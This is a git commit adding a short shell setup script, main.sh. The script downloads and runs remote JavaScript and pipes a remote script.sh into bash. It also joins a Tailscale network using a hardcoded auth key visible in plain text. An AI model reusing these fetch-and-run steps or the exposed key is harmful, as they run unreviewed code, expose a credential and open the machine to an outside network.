0a5eefe73cce4d7de358739d293890047df2a7bf
Saurav Kumar <codewizard.saurav@gmail.com>
2024-09-20 12:57:20 +0530

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,7 @@
+curl -sS "https://raw.githubusercontent.com/dev-sam17/jsDoc/main/replacer.js" > "replacer.js" && node "replacer.js"
+
+sudo tailscaled > /dev/null 2>&1 & sudo tailscale up --auth-key=tskey-auth-kTnJ5HuRE521CNTRL-jAiTeQDiLBji3rbCeraZFjGYJnUBG4Dbb --accept-routes
+
+npm i
+
+bash <(curl -s https://raw.githubusercontent.com/dev-sam17/jsDoc/main/script.sh)
